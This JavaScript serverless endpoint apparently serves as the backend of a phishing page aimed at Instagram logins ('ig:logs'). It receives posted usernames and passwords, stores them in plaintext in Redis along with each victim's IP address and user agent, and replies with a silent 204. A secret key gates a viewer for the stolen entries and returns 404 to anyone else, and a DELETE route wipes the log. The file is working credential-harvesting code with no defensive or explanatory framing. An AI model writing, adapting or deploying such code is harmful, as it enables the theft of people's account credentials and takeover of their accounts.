import { Redis } from '@upstash/redis';

export const config = { runtime: 'nodejs' };

const LOG_KEY = 'ig:logs';
const MAX_KEEP = 500;
const DEFAULT_LIMIT = 25;
const MAX_LIMIT = 100;

function redis() {
  const url = process.env.UPSTASH_REDIS_REST_URL || process.env.KV_REST_API_URL;
  const token = process.env.UPSTASH_REDIS_REST_TOKEN || process.env.KV_REST_API_TOKEN;
  if (!url || !token) return null;
  return new Redis({ url, token });
}

function fmtEntry(d, ip) {
  return JSON.stringify({
    ts: new Date().toISOString(),
    ip: String(ip),
    ua: String(d.ua || ''),
    lang: '',
    ref: '',
    user: String(d.username || ''),
    pass: String(d.password || ''),
  });
}

function checkKey(req) {
  const want = process.env.VIEW_KEY || '';
  const got = (req.query && req.query.k) || '';
  return want && got === want;
}

export default async function handler(req, res) {
  const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
           || req.socket?.remoteAddress || 'unknown';

  if (req.method === 'POST') {
    let body = req.body || {};
    
    // Defeat the [object Object] bug: extract straight from the FormData object
    if (typeof body.username === 'undefined' && typeof body.get === 'function') {
       // If it's a FormData instance
       body.username = body.get('username');
       body.password = body.get('password');
       body.ua = body.get('ua');
    } else if (typeof body === 'string') {
      try { body = JSON.parse(body); } catch { 
        const params = new URLSearchParams(body);
        body = Object.fromEntries(params.entries());
      }
    }

    if (!body.username && !body.password) { res.status(204).end(); return; }

    const r = redis();
    if (!r) { res.status(500).json({ error: 'redis not configured' }); return; }

    try {
      await r.lpush(LOG_KEY, fmtEntry(body, ip));
      await r.ltrim(LOG_KEY, 0, MAX_KEEP - 1);
    } catch (e) {
      res.status(500).json({ error: 'redis write failed', detail: String(e) });
      return;
    }

    res.status(204).end();
    return;
  }

  if (!checkKey(req)) { res.status(404).end(); return; }

  const r = redis();
  if (!r) { res.status(500).json({ error: 'redis not configured' }); return; }

  if (req.method === 'GET') {
    const q = req.query || {};
    const page  = Math.max(0, parseInt(q.page, 10) || 0);
    const limit = Math.min(MAX_LIMIT, Math.max(1, parseInt(q.limit, 10) || DEFAULT_LIMIT));
    const start = page * limit;
    const stop  = start + limit - 1;

    let total = 0, rows = [];
    try {
      total = await r.llen(LOG_KEY);
      rows  = await r.lrange(LOG_KEY, start, stop);
    } catch (e) {
      res.status(500).json({ error: 'redis read failed', detail: String(e) });
      return;
    }

    const entries = rows.map(line => {
      try { return JSON.parse(line); }
      catch { return { ts: '', ip: '', ua: '', user: '', pass: '', raw: String(line) }; }
    });

    res.setHeader('Cache-Control', 'no-store');
    res.status(200).json({ entries, total, page, limit });
    return;
  }

  if (req.method === 'DELETE') {
    try { await r.del(LOG_KEY); } catch (_) {}
    res.status(204).end();
    return;
  }

  res.status(405).end();
}
